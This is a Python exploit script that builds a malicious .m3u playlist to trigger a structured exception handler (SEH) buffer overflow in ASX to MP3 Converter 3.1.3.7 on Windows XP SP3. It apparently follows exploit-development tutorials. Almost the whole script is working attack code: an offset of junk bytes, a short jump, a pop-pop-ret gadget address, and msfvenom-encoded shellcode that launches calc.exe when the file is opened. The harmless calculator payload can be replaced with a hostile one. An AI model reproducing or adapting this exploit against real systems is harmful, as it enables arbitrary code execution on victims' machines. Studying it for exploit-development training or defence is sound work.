#
####################################################
# ASX to MP3 Converter version 3.1.3.7 SEH Exploit #
####################################################
#
# Author: FatRodzianko
# Software Download: http://web.archive.org/web/20130128102546/http://www.rm-to-mp3.net/downloads/ASXtoMP3Converter.exe
# References: http://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/
# References: http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/
# References: https://www.exploit-db.com/exploits/8407
# References: https://github.com/corelan/mona
#
# Description: Generates a .m3u file that will launch calc.exe when opened by the "ASX to MP3 Converter" software
#
# Requirements: Windows XP SP3. The .m3u file must be located at "C:\asx2mp3.m3u" for offset to work
# 

payloadFile = open("asx2mp3.m3u","w")

# Offset to SEH of 43,525
junk = "\x41"*43525

# jmp 0x14 NOP NOP
seh = "\xeb\x14\x90\x90"

# found with immunity using mona.py "!mona seh -n"
# 0x10031799 : pop ebx # pop eax # ret  |  {PAGE_EXECUTE_READ} [MSA2Mfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll)
sehandler = "\x99\x17\x03\x10"
nops = "\x90"*20

# msfvenom --payload windows/exec CMD=calc EXITFUNC=seh --encode x86/shikata_ga_nai -f python
buf =  ""
buf += "\xd9\xd0\xd9\x74\x24\xf4\xba\xba\x47\x6a\xab\x5e\x33"
buf += "\xc9\xb1\x31\x83\xee\xfc\x31\x56\x14\x03\x56\xae\xa5"
buf += "\x9f\x57\x26\xab\x60\xa8\xb6\xcc\xe9\x4d\x87\xcc\x8e"
buf += "\x06\xb7\xfc\xc5\x4b\x3b\x76\x8b\x7f\xc8\xfa\x04\x8f"
buf += "\x79\xb0\x72\xbe\x7a\xe9\x47\xa1\xf8\xf0\x9b\x01\xc1"
buf += "\x3a\xee\x40\x06\x26\x03\x10\xdf\x2c\xb6\x85\x54\x78"
buf += "\x0b\x2d\x26\x6c\x0b\xd2\xfe\x8f\x3a\x45\x75\xd6\x9c"
buf += "\x67\x5a\x62\x95\x7f\xbf\x4f\x6f\x0b\x0b\x3b\x6e\xdd"
buf += "\x42\xc4\xdd\x20\x6b\x37\x1f\x64\x4b\xa8\x6a\x9c\xa8"
buf += "\x55\x6d\x5b\xd3\x81\xf8\x78\x73\x41\x5a\xa5\x82\x86"
buf += "\x3d\x2e\x88\x63\x49\x68\x8c\x72\x9e\x02\xa8\xff\x21"
buf += "\xc5\x39\xbb\x05\xc1\x62\x1f\x27\x50\xce\xce\x58\x82"
buf += "\xb1\xaf\xfc\xc8\x5f\xbb\x8c\x92\x35\x3a\x02\xa9\x7b"
buf += "\x3c\x1c\xb2\x2b\x55\x2d\x39\xa4\x22\xb2\xe8\x81\xdd"
buf += "\xf8\xb1\xa3\x75\xa5\x23\xf6\x1b\x56\x9e\x34\x22\xd5"
buf += "\x2b\xc4\xd1\xc5\x59\xc1\x9e\x41\xb1\xbb\x8f\x27\xb5"
buf += "\x68\xaf\x6d\xd6\xef\x23\xed\x37\x8a\xc3\x94\x47"


pad = "\x44"* (50000 - len(junk) - 8 -len(nops) - len (buf) -len(nops))
payloadFile.write(junk+seh+sehandler+nops+buf+nops+pad)
payloadFile.close

print "Payload file created"
